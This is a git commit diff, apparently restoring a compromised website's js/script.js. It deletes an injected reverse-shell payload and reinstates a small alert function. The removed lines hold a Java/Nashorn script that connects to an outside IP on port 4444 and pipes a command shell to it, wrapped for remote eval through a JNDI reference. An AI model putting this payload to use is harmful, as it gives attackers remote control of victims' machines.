4efe5424e88f21a28afca9e1fdcf5cc56851da88
PYTHON-PLAYER279 <120033604+PYTHON-PLAYER279@users.noreply.github.com>
2023-07-10 16:53:27 +0530

    restore After the Hack
    this got hacked and restored

--- js/script.js
+++ js/script.js
@@ -1,31 +1,3 @@
-String command = "var host = '112.134.227.36';" +
-                       "var port = 4444;" +
-                       "var cmd = 'cmd';"+
-                       "var s = new java.net.Socket(host, port);" +
-                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
-                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
-                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
-                       "print ('Connected');"+
-                       "while (!s.isClosed()) {"+
-                       "    while (pi.available() > 0)"+
-                       "        so.write(pi.read());"+
-                       "    while (pe.available() > 0)"+
-                       "        so.write(pe.read());"+
-                       "    while (si.available() > 0)"+
-                       "        po.write(si.read());"+
-                       "    so.flush();"+
-                       "    po.flush();"+
-                       "    java.lang.Thread.sleep(50);"+
-                       "    try {"+
-                       "        p.exitValue();"+
-                       "        break;"+
-                       "    }"+
-                       "    catch (e) {"+
-                       "    }"+
-                       "}"+
-                       "p.destroy();"+
-                       "s.close();";
-String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
-function lul(){
-	ref.add(new StringRefAddr("x", x);
+function msg(text) {
+	alert(text);
 }
